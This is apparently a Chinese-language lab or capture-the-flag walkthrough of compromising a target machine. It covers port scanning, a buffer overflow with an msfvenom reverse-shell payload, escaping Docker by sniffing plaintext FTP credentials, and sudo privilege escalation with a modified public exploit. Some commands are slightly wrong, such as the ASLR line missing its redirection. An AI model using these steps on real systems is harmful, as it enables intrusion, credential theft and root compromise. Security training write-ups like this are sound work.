# 第12周

**注:本周靶机较难,复现过程较为复杂,故在此只体现思路与指令**

## 	1.端口&服务扫描:

`sudo nmap -p- ip`
		`sudo nmap -p21,22,80,2222,9898 -sV -sC ip`

	1.21ftp: 发现ftp-anon:获得ELF可执行程序server
	2.22ssh
	3.80web服务: 扫描目录后无有价值的信息
	4.2222:ssh:注意,两个ssh服务,且版本不一.怀疑docker
	5.9898:自定义程序,与server一致

## 	2.模糊测试&缓冲区溢出

```sh
0.关闭ALSR,便于进行本地漏洞调试
	echo 0 /proc/sys/kernel/randomize_va_space

1.生成较长的payload,发现缓冲区溢出
	python3 -c "print('A'*200)"

2.使用edb-debugger进行图形化调试

3.确定eip的偏移量;同时发现esp可控
	msf-pattern_create -l 200
	msf-pattern_offset -l 200 -p [pattern]

4.利用edb插件搜索`jmp esp`的地址

5.使用python编写漏洞利用脚本,使用msfvenom生成shellcode
	msfvenom -e linux/x86/shell_reverse_tcp LHOST=ip LPORT=4444 -b '\x00' -f py

6.技巧:在shellcode前加上32个nop('\x90')

7.对靶机发起攻击
	注意:shellcode: 要去除坏字符\x00;在python中可以直接以字符串形式输出shellcode
```

## 	3.docker逃逸

​	0.检查ip、根目录后发现docker环境
​			1.发现.credits.txt文件,使用其中的密码ssh登陆
​			2.使用`tcpdump -i eth0 port 21`抓取ftp流量,获取其中的明文用户与密码
​			3.使用捕获的用户密码登陆真实靶机

## 	4.提权

​	0.普通的提权向量无用
​			1.以内核版本为线索,发现了sudo本地提权漏洞
​			2.搜取网上exp,下载并执行,发现出错
​			3.对源码进行分析后确定范围
​			4.发现sudo的路径与exp不符合,修改exp
​			`which sudo`
​			5.利用exp成功提权
